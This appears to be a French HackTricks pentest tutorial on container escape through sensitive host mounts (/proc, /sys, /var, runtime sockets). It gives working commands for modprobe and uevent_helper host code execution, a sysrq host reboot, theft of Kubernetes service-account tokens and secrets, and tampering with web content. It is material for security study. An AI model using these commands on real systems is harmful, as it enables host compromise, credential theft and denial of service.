# Montages d'hôte sensibles

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les host mounts sont l'une des surfaces d'évasion de container les plus importantes en pratique parce qu'ils font souvent passer une vue de processus soigneusement isolée à une visibilité directe des ressources de l'hôte. Les cas dangereux ne se limitent pas à `/`. Des bind mounts de `/proc`, `/sys`, `/var`, des sockets runtime, l'état géré par kubelet, ou des chemins liés aux périphériques peuvent exposer des contrôles du kernel, des informations d'identification, les systèmes de fichiers de containers voisins, et des interfaces de gestion runtime.

Cette page existe séparément des pages de protection individuelles parce que le modèle d'abus est transversal. Un host mount inscriptible est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin exact de l'hôte exposé. Le traiter comme un sujet à part rend la surface d'attaque beaucoup plus facile à raisonner.

## `/proc` Exposure

procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du kernel à fort impact. Un bind mount tel que `-v /proc:/host/proc` ou une vue du container exposant des entrées proc inattendues et écrites peut donc conduire à la divulgation d'informations, un déni de service, ou l'exécution directe de code sur l'hôte.

Les chemins procfs à haute valeur incluent :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abus

Commencez par vérifier quelles entrées procfs à haute valeur sont visibles ou écrites :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe`, et `binfmt_misc` peuvent devenir des vecteurs d'exécution de code sur l'hôte lorsqu'ils sont inscriptibles. `kallsyms`, `kmsg`, `kcore`, et `config.gz` sont des sources de reconnaissance puissantes pour l'exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des processus, des cgroups et du système de fichiers, ce qui peut aider à reconstituer la topologie de l'hôte depuis l'intérieur du conteneur.

La valeur pratique de chaque chemin diffère, et les traiter tous comme s'ils avaient le même impact complique le triage :

- `/proc/sys/kernel/core_pattern`
S'il est inscriptible, il s'agit de l'un des chemins procfs à plus fort impact car le kernel exécutera un gestionnaire de pipe après un crash. Un conteneur capable de pointer `core_pattern` vers une payload stockée dans son overlay ou dans un chemin monté de l'hôte peut souvent obtenir l'exécution de code sur l'hôte. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle le userspace helper utilisé par le kernel lorsqu'il doit invoquer la logique de chargement de modules. S'il est inscriptible depuis le conteneur et interprété dans le contexte de l'hôte, il peut devenir un autre primitive d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné avec un moyen de déclencher le chemin de l'helper.
- `/proc/sys/vm/panic_on_oom`
Ce n'est généralement pas un primitive d'évasion propre, mais il peut convertir la pression mémoire en un déni de service à l'échelle de l'hôte en transformant les conditions OOM en un comportement de kernel panic.
- `/proc/sys/fs/binfmt_misc`
S'il est possible d'écrire sur l'interface d'enregistrement, l'attaquant peut enregistrer un handler pour une valeur magique choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le triage d'exploits kernel. Il aide à déterminer quels sous-systèmes, atténuations et fonctionnalités optionnelles du kernel sont activés sans nécessiter les métadonnées des paquets de l'hôte.
- `/proc/sysrq-trigger`
Principalement un chemin de déni de service, mais très sérieux. Il peut redémarrer, provoquer un kernel panic, ou autrement perturber immédiatement l'hôte.
- `/proc/kmsg`
Révèle les messages du kernel ring buffer. Utile pour le fingerprinting de l'hôte, l'analyse de crash, et, dans certains environnements, pour leaking d'informations utiles à l'exploitation du kernel.
- `/proc/kallsyms`
Précieux lorsqu'il est lisible car il expose les symboles exportés du kernel et peut aider à contourner les hypothèses d'address randomization pendant le développement d'exploits kernel.
- `/proc/[pid]/mem`
C'est une interface directe vers la mémoire d'un processus. Si le processus cible est accessible avec les conditions de type ptrace nécessaires, cela peut permettre de lire ou modifier la mémoire d'un autre processus. L'impact réel dépend fortement des identifiants, de `hidepid`, de Yama et des restrictions ptrace, donc c'est un chemin puissant mais conditionnel.
- `/proc/kcore`
Expose une vue de type core-image de la mémoire système. Le fichier est énorme et difficile à utiliser, mais s'il est lisible de manière significative, il indique une surface mémoire de l'hôte mal exposée.
- `/proc/kmem` and `/proc/mem`
Historiquement des interfaces mémoire brute à fort impact. Sur de nombreux systèmes modernes elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables elles doivent être traitées comme des découvertes critiques.
- `/proc/sched_debug`
Leaks des informations de scheduling et de tâches qui peuvent exposer l'identité des processus de l'hôte même lorsque d'autres vues des processus semblent plus propres que prévu.
- `/proc/[pid]/mountinfo`
Extrêmement utile pour reconstituer où le conteneur se trouve réellement sur l'hôte, quels chemins reposent sur l'overlay, et si un mount inscriptible correspond au contenu de l'hôte ou uniquement à la couche du conteneur.

Si `/proc/[pid]/mountinfo` ou les détails de l'overlay sont lisibles, utilisez-les pour retrouver le chemin hôte du système de fichiers du conteneur :
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ces commandes sont utiles car un certain nombre d'astuces d'exécution côté hôte nécessitent de convertir un chemin à l'intérieur du conteneur en le chemin correspondant du point de vue de l'hôte.

### Exemple complet: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le conteneur et que le helper path est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant :
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du kernel, mais l'essentiel est qu'un writable helper path peut rediriger une future invocation d'un kernel helper vers du contenu host-path contrôlé par l'attaquant.

### Exemple complet : Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Si le but est exploitability assessment plutôt qu'un escape immédiat :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes aident à déterminer si des informations de symboles utiles sont visibles, si des messages récents du noyau révèlent un état intéressant et quelles fonctionnalités du noyau ou quels mécanismes d'atténuation sont compilés. L'impact n'est généralement pas une évasion directe, mais cela peut fortement réduire le temps de triage des vulnérabilités du noyau.

### Exemple complet : SysRq Host Reboot

Si `/proc/sysrq-trigger` est inscriptible et accessible depuis la vue de l'hôte :
```bash
echo b > /proc/sysrq-trigger
```
L'effet est un redémarrage immédiat de l'hôte. Ce n'est pas un exemple subtil, mais il démontre clairement que l'exposition de procfs peut être bien plus grave qu'une simple divulgation d'informations.

## Exposition de `/sys`

sysfs expose de grandes quantités d'état du noyau et des périphériques. Certains chemins sysfs sont principalement utiles pour le fingerprinting, tandis que d'autres peuvent affecter l'exécution des helpers, le comportement des périphériques, la configuration des modules de sécurité, ou l'état du firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins importent pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l'hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des informations de crash-dump et de kernel-layout qui aident au fingerprinting bas niveau de l'hôte. `/sys/kernel/security` est l'interface `securityfs` utilisée par Linux Security Modules, donc un accès inattendu peut exposer ou altérer l'état lié au MAC. Les chemins des variables EFI peuvent affecter les paramètres de démarrage pris en charge par le firmware, ce qui les rend bien plus sérieux que de simples fichiers de configuration. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car il s'agit intentionnellement d'une interface orientée développeur avec beaucoup moins d'attentes de sécurité que les API du kernel durcies et destinées à la production.

Les commandes utiles pour examiner ces chemins sont :
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` peut révéler si AppArmor, SELinux, ou une autre surface LSM est visible d'une manière qui aurait dû rester host-only.
- `/sys/kernel/debug` est souvent la découverte la plus alarmante de ce groupe. Si `debugfs` est monté et lisible ou accessible en écriture, attendez‑vous à une large surface orientée noyau dont le risque exact dépend des debug nodes activés.
- EFI variable exposure est moins courante, mais si elle est présente elle a un fort impact car elle touche des paramètres gérés par le firmware plutôt que des fichiers d'exécution ordinaires.
- `/sys/class/thermal` concerne principalement la stabilité de l'hôte et l'interaction matérielle, pas pour permettre une évasion de type shell élégante.
- `/sys/kernel/vmcoreinfo` est principalement une source de host-fingerprinting et d'analyse de crash, utile pour comprendre l'état bas niveau du noyau.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` est accessible en écriture, le noyau peut exécuter un helper contrôlé par un attaquant lorsqu'un `uevent` est déclenché :
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La raison pour laquelle cela fonctionne est que le helper path est interprété du point de vue de l'hôte. Une fois déclenché, le helper s'exécute dans le contexte de l'hôte plutôt qu'à l'intérieur du conteneur courant.

## `/var` Exposition

Le montage du `/var` de l'hôte dans un conteneur est souvent sous-estimé parce que cela ne semble pas aussi spectaculaire que de monter `/`. En pratique, cela peut suffire pour atteindre des sockets runtime, des répertoires de snapshots de conteneurs, des volumes de pod gérés par kubelet, des tokens de service-account projetés, et les systèmes de fichiers des applications voisines. Sur les nœuds modernes, `/var` est souvent l'endroit où vit l'état de conteneur le plus intéressant d'un point de vue opérationnel.

### Exemple Kubernetes

Un pod avec `hostPath: /var` peut souvent lire les tokens projetés d'autres pods et le contenu des snapshots overlay :
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles car elles indiquent si le mount n'expose que des données applicatives banales ou des identifiants de cluster à fort impact. Un service-account token lisible peut immédiatement transformer une local code execution en accès à Kubernetes API.

Si le token est présent, vérifiez ce qu'il peut atteindre au lieu de vous arrêter à la découverte du token :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impact ici peut être bien plus important que l'accès au nœud local. Un token avec des droits RBAC étendus peut transformer un `/var` monté en compromission à l'échelle du cluster.

### Docker et containerd — Exemple

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nœuds Kubernetes utilisant containerd elles peuvent se trouver sous `/var/lib/containerd` ou des chemins spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le montage de `/var` expose des contenus de snapshot modifiables d'une autre workload, l'attaquant peut être en mesure de modifier des fichiers d'application, d'implanter du contenu web ou de modifier des scripts de démarrage sans toucher à la configuration actuelle du container.

Idées concrètes d'abus une fois qu'un contenu de snapshot modifiable est trouvé :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ces commandes sont utiles car elles montrent les trois principales familles d'impact d'un montage de `/var` : altération d'applications, récupération de secrets et mouvement latéral vers des workloads voisins.

## Sockets d'exécution

Les montages sensibles sur l'hôte incluent souvent des sockets d'exécution plutôt que des répertoires complets. Ceux-ci sont si importants qu'ils méritent d'être rappelés explicitement ici :
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flux d'exploitation complets une fois qu'un de ces sockets est monté.

Comme premier schéma d'interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l'une d'entre elles réussit, le chemin depuis "mounted socket" vers "start a more privileged sibling container" est généralement beaucoup plus court que n'importe quel kernel breakout path.

## CVE liées aux montages

Les montages d'hôte intersectent aussi les vulnérabilités d'exécution. Exemples récents importants :

- `CVE-2024-21626` dans `runc`, où un leaked directory file descriptor pourrait placer le répertoire de travail sur le système de fichiers de l'hôte.
- `CVE-2024-23651` et `CVE-2024-23653` dans BuildKit, où des copy-up races d'OverlayFS pourraient produire des écritures sur des chemins de l'hôte pendant les builds.
- `CVE-2024-1753` dans les flux de build Buildah et Podman, où des bind mounts spécialement conçus pendant la build pourraient exposer `/` en lecture-écriture.
- `CVE-2024-40635` dans containerd, où une grande valeur `User` pourrait déborder vers un comportement UID 0.

Ces CVE sont importantes ici car elles montrent que la gestion des montages ne concerne pas seulement la configuration de l'opérateur. Le runtime lui-même peut aussi introduire des conditions d'escape liées aux montages.

## Vérifications

Utilisez ces commandes pour localiser rapidement les expositions de montages à impact le plus élevé :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce qui est intéressant ici :

- La racine de l'hôte, `/proc`, `/sys`, `/var` et les sockets d'exécution sont tous des constats à haute priorité.
- Les entrées proc/sys modifiables signifient souvent que le montage expose des contrôles du noyau globaux de l'hôte plutôt qu'une vue sûre du conteneur.
- Les chemins `/var` montés méritent un examen des credentials et des neighboring-workloads, pas seulement un examen du système de fichiers.
{{#include ../../../banners/hacktricks-training.md}}
